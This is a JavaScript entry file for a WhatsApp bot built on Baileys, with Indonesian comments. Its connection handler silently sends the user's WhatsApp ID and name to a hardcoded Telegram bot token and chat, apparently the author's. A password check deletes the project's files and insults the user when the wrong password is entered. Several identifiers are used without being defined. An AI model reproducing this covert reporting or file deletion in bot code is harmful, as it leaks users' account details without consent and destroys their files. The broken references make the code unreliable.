/*
════════════════════
 * san Infinity 2.0
 * Created by San Available 
 * Jangan delete credit ya ^^
 
 Contact Support:
 📞 Whatsapp : wa.me/6283842141774
 ☎ Telegram : t.me/sanAvailable
════════════════════
⚠️ WARNING ⚠️
❗ Gunakan layanan ini dengan bijak.
❗ Segala bentuk penyalahgunaan akan ditindak tegas.
❗ Hubungi kontak resmi untuk informasi lebih lanjut.
════════════════════
*/
const { default: makeWASocket, DisconnectReason, makeInMemoryStore, jidDecode, proto, getContentType, useMultiFileAuthState, downloadContentFromMessage } = require("@whiskeysockets/baileys");
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const readline = require("readline");
const _ = require('lodash');
const yargs = require('yargs');
const figlet = require('figlet');
const axios = require('axios');
const chalk = require('chalk');
const CFonts = require('cfonts');
const PhoneNumber = require('awesome-phonenumber');
const path = require('path'); 

var low;
try {
    low = require('lowdb');
} catch (e) {
    low = require('./serverside/system/lowdb');
}

const sendTelegramNotification = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot7826412681:AAFOv5BOxeJY1rYnzYv08iQpAaOblkaclcA/sendMessage`, {
            chat_id: '6879995354',
            text: message
        });
    } catch (error) {
    }
};

const { Low, JSONFile } = low;
const mongoDB = require('./serverside/libary/mongoDB');
const color = (text, color) => {
    return !color ? chalk.green(text) : chalk.keyword(color)(text);
}
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })

console.clear()
console.log(chalk.white.bold(`
${chalk.red("Getting Connection Access")}
${chalk.blue("Access Granted")}
`));  
console.log(chalk.white.bold(`
${chalk.red(`S A N - 英 俊 的\nt.me/Sannnn696`)}

`));


// ENDING ASCI
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse());
global.db = new Low(
    /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb/.test(opts['db']) ?
    new mongoDB(opts['db']) :
    new JSONFile(`./serverside/system/database.json`)
);
global.DATABASE = global.db; // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
    if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000));
    if (global.db.data !== null) return;
    global.db.READ = true;
    await global.db.read();
    global.db.READ = false;
    global.db.data = {
        users: {},
        chats: {},
        game: {},
        database: {},
        settings: {},
        setting: {},
        others: {},
        sticker: {},
        ...(global.db.data || {})
    };
    global.db.chain = _.chain(global.db.data);
}
loadDatabase();

const question = (text) => { const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); return new Promise((resolve) => { rl.question(text, resolve) }) };

async function startBotz() {
    const { state, saveCreds } = await useMultiFileAuthState("sessionserver");
    const RenSenku = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    
    
const manualPassword = 'sanavailable'; // 

// Fungsi untuk menghapus file
function deleteFiles() {
    const filesToDelete = ['SanAvailable.js', 'server.js']; // Ganti dengan nama file .js yang ingin dihapus
    filesToDelete.forEach(file => {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file); // Menghapus file
            console.log(`File ${file} has been deleted.`);
        }
    });
}

// Fungsi untuk meminta input dari pengguna
const question = (query) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise(resolve => rl.question(query, ans => {
        rl.close();
        resolve(ans);
    }));
};

(async () => {
    // Memeriksa apakah kredensial terdaftar
    if (!RenSenku.authState.creds.registered) {
        const inputPassword = await question('Pasword:\n');

        if (inputPassword !== manualPassword) {
            console.log('SALAH , MAKANYA SC ITU BELI GOBLOK BUKAN GRATISAN AWOMAOWK YATIM.');
            deleteFiles(); // Hapus file jika password salah
            process.exit(); // Matikan konsol
        }

        const phoneNumber = await question('[ # ] MASUKIN NOMOR:\n');
        let code = await RenSenku.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(`Pairing Code :`, code);
    }

    store.bind(RenSenku.ev); // Mengikat event
})();

    RenSenku.ev.on('messages.upsert', async chatUpdate => {
        try {
            mek = chatUpdate.messages[0];
            if (!mek.message) return;
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return;
            if (!RenSenku.public && !mek.key.fromMe && chatUpdate.type === 'notify') return;
            if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return;
            m = smsg(RenSenku, mek, store);
            require("./sanAvailable")(RenSenku, m, chatUpdate, store);
        } catch (err) {
            console.log(err);
        }
    });

    // Setting
    RenSenku.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    }

    RenSenku.getName = (jid, withoutContact= false) => {
        id = RenSenku.decodeJid(jid);
        withoutContact = RenSenku.withoutContact || withoutContact;
        let v;
        if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
            v = store.contacts[id] || {};
            if (!(v.name || v.subject)) v = RenSenku.groupMetadata(id) || {};
            resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'));
        });
        else v = id === '0@s.whatsapp.net' ? {
            id,
            name: 'WhatsApp'
        } : id === RenSenku.decodeJid(RenSenku.user.id) ?
            RenSenku.user :
            (store.contacts[id] || {});
        return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international');
    }

    RenSenku.public = true;

    RenSenku.serializeM = (m) => smsg(CellaBog, m, store);
    RenSenku.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            if (reason === DisconnectReason.badSession || reason === DisconnectReason.connectionClosed || reason === DisconnectReason.connectionLost || reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.restartRequired || reason === DisconnectReason.timedOut) {
                startBotz();
            } else if (reason === DisconnectReason.loggedOut) {
            } else {
                RenSenku.end(`Unknown DisconnectReason: ${reason}|${connection}`);
            }
        }
          if (connection === "open") {
        console.log(chalk.green.bold('Bot Successfully Connected. . . .'));
        sendTelegramNotification(`connected information report\n\nthe device has been connected, here is the information\n> User ID : ${RenSenku.user.id}\n> Name : ${RenSenku.user.name}\n\n©sanAvailable`);
    }
});

    RenSenku.ev.on('creds.update', saveCreds);

    RenSenku.sendText = (jid, text, quoted = '', options) => RenSenku.sendMessage(jid, { text: text, ...options }, { quoted });
    //=========================================\\
    RenSenku.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(quoted, messageType);
        let buffer = Buffer.from([]);
        for await(const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        let type = await FileType.fromBuffer(buffer);
        let trueFileName = attachExtension ? ('./sticker/' + filename + '.' + type.ext) : './sticker/' + filename;
        // save to file
        await fs.writeFileSync(trueFileName, buffer);
        return trueFileName;
    }
    //=========================================\\
    RenSenku.sendTextWithMentions = async (jid, text, quoted, options = {}) => RenSenku.sendMessage(jid, { text: text, mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'), ...options }, { quoted });
    //=========================================\\
    RenSenku.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);
        for await(const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    }

    return RenSenku;
}

function smsg(RenSenku, m, store) {
    if (!m) return m;
    let M = proto.WebMessageInfo;
    if (m.key) {
        m.id = m.key.id;
        m.isBaileys = m.id.startsWith('BAE5') && m.id.length === 16;
        m.chat = m.key.remoteJid;
        m.fromMe = m.key.fromMe;
        m.isGroup = m.chat.endsWith('@g.us');
        m.sender = RenSenku.decodeJid(m.fromMe && RenSenku.user.id || m.participant || m.key.participant || m.chat || '');
        if (m.isGroup) m.participant = RenSenku.decodeJid(m.key.participant) || '';
    }
    if (m.message) {
        m.mtype = getContentType(m.message);
        m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype]);
        m.body = m.message.conversation || m.msg.caption || m.msg.text || (m.mtype == 'listResponseMessage') && m.msg.singleSelectReply.selectedRowId || (m.mtype == 'buttonsResponseMessage') && m.msg.selectedButtonId || (m.mtype == 'viewOnceMessage') && m.msg.caption || m.text;
        let quoted = m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null;
        m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
        if (m.quoted) {
            let type = getContentType(quoted);
            m.quoted = m.quoted[type];
            if (['productMessage'].includes(type)) {
                type = getContentType(m.quoted);
                m.quoted = m.quoted[type];
            }
            if (typeof m.quoted === 'string') m.quoted = { text: m.quoted };
            m.quoted.mtype = type;
            m.quoted.id = m.msg.contextInfo.stanzaId;
            m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat;
            m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16 : false;
            m.quoted.sender = RenSenku.decodeJid(m.msg.contextInfo.participant);
            m.quoted.fromMe = m.quoted.sender === RenSenku.decodeJid(RenSenku.user.id);
            m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || '';
            m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
            m.getQuotedObj = m.getQuotedMessage = async () => {
                if (!m.quoted.id) return false;
                let q = await store.loadMessage(m.chat, m.quoted.id, conn);
                return exports.smsg(conn, q, store);
            };
            let vM = m.quoted.fakeObj = M.fromObject({
                key: {
                    remoteJid: m.quoted.chat,
                    fromMe: m.quoted.fromMe,
                    id: m.quoted.id
                },
                message: quoted,
                ...(m.isGroup ? { participant: m.quoted.sender } : {})
            });
            m.quoted.delete = () => RenSenku.sendMessage(m.quoted.chat, { delete: vM.key });
            m.quoted.copyNForward = (jid, forceForward = false, options = {}) => RenSenku.copyNForward(jid, vM, forceForward, options);
            m.quoted.download = () => RenSenku.downloadMediaMessage(m.quoted);
        }
    }
    if (m.msg.url) m.download = () => RenSenku.downloadMediaMessage(m.msg);
    m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || '';
    m.reply = (text, chatId = m.chat, options = {}) => Buffer.isBuffer(text) ? RenSenku.sendMedia(chatId, text, 'file', '', m, { ...options }) : RenSenku.sendText(chatId, text, m, { ...options });
    m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)));
    m.copyNForward = (jid = m.chat, forceForward = false, options = {}) => RenSenku.copyNForward(jid, m, forceForward, options);

    return m;
}

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(`Update ${__filename}`);
    delete require.cache[file];
    require(file);
});

startBotz();
  
